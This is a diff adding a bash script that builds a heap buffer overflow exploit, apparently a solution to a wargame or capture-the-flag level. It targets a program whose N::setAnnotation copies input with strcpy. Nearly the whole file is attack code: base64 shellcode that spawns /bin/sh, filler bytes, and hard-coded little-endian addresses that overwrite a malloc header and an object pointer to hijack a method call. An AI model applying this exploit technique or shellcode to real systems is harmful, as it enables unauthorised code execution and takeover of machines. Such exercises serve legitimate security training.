@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# Helper function, "put n s" print the string 's' n times
+put() { printf "$2%.0s" $(seq 1 "$1"); }
+
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# Helper function, "compute '16 - 4'" gives "12"
+compute() { echo "$1" | bc | tr -d '\n' ; }
+
+# 'N::setAnnotation' uses 'strcpy'
+# We can use a heap buffer overflow to overwrite 'n2->operator::+'
+# We set a shellcode in 'n1->annotation' and overwrite 'n2->operator::+' to point to it
+
+# Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
+SHELLCODE_BASE64="McBQBAtoLy9zaGgvYmluieMxyTHSzYA="
+SHELLCODE="$(echo ${SHELLCODE_BASE64} | base64 --decode)"
+SHELLCODE_SIZE=$(printf "${SHELLCODE}" | wc -c)
+
+# We fill the set 'a.str' to the shellcode and some filler
+ASTR_SIZE=100
+ASTR_FILLER_SIZE="$(compute "${ASTR_SIZE} - ${SHELLCODE_SIZE}")"
+ASTR_FILLER="$(put "${ASTR_FILLER_SIZE}" A)"
+
+# We fill 'a.val'
+AVAL_SIZE=4
+AVAL_FILLER="$(put "${AVAL_SIZE}" B)"
+
+# We set the malloc header to the adress of the shellcode
+ASTR_ADDRESS="0804a00c"
+SHELLCODE_ADDRESS="${ASTR_ADDRESS}"
+MALLOC_HEADER="$(hex_little_endian "${SHELLCODE_ADDRESS}")"
+
+# We set 'b.add' to the pointer to the address of the shellcode
+POINTER_SHELLCODE_ADDRESS="0804a074"
+BADD="$(hex_little_endian "${POINTER_SHELLCODE_ADDRESS}")"
+
+# We print our exploit to the input and wait for the reverse shell to open with cat
+INPUT="${SHELLCODE}${ASTR_FILLER}${AVAL_FILLER}${MALLOC_HEADER}${BADD}"
+echo "${INPUT}"
